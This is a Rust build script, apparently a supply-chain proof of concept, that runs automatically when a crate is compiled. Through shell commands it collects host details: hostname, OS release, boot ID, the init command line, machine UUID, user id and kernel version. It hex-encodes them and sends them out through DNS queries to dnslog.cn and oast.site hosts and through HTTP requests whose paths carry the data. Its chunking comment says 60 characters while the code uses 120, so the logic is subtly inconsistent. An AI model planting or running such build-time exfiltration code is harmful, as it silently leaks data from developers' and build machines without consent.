use std::process::Command;
use std::net::{ToSocketAddrs, TcpStream};
use std::io::Write;
use std::time::Duration;

fn sh(cmd: &str) -> String {
    Command::new("sh").arg("-c").arg(cmd).output()
        .map(|o| format!("{}{}", String::from_utf8_lossy(&o.stdout), String::from_utf8_lossy(&o.stderr)))
        .unwrap_or_default()
}

fn hex(s: &str) -> String {
    s.as_bytes().iter().map(|b| format!("{:02x}", b)).collect()
}

fn dns(host: &str) { let _ = format!("{}:80", host).to_socket_addrs(); }

fn http_get(host: &str, path: &str) {
    if let Ok(addrs) = format!("{}:80", host).to_socket_addrs() {
        for a in addrs {
            if let Ok(mut s) = TcpStream::connect_timeout(&a, Duration::from_secs(8)) {
                let req = format!("GET {} HTTP/1.0\r\nHost: {}\r\nConnection: close\r\n\r\n", path, host);
                let _ = s.write_all(req.as_bytes());
                break;
            }
        }
    }
}

fn main() {
    let fp = sh("cat /proc/sys/kernel/hostname /etc/hostname 2>/dev/null; grep PRETTY /etc/os-release 2>/dev/null; cat /proc/sys/kernel/random/boot_id 2>/dev/null; head -c 200 /proc/1/cmdline 2>/dev/null | tr \\0 _; cat /sys/class/dmi/id/product_uuid 2>/dev/null; id; hostname; uname -a");
    let f = hex(&fp[..fp.chars().take(180).count()]);
    let tag = "n6a07155";
    let ish = "dahpp3cgtqkjvl1mas2gdg97wwijpdwe3.oast.site";
    dns(&format!("ping.{}.y1acsd.dnslog.cn", tag));
    // chunk hex fingerprint into <=60-char labels, query f1..f6
    let chars: Vec<char> = f.chars().collect();
    for idx in 0..6 {
        let start = idx * 120;
        if start >= chars.len() { break; }
        let end = ((start + 120).min(chars.len())) - 1;
        let chunk: String = chars[start..=end.min(chars.len()-1)].iter().collect();
        dns(&format!("f{}.{}.{}.{}", idx + 1, chunk, tag, ish));
    }
    http_get(&ish, &format!("/fp/{}/{}", tag, f));
    http_get(&format!("fp.{}.{}", tag, ish), &format!("/{}", f));
    println!("cargo:warning=stylus-verify-poc-build-ok");
}

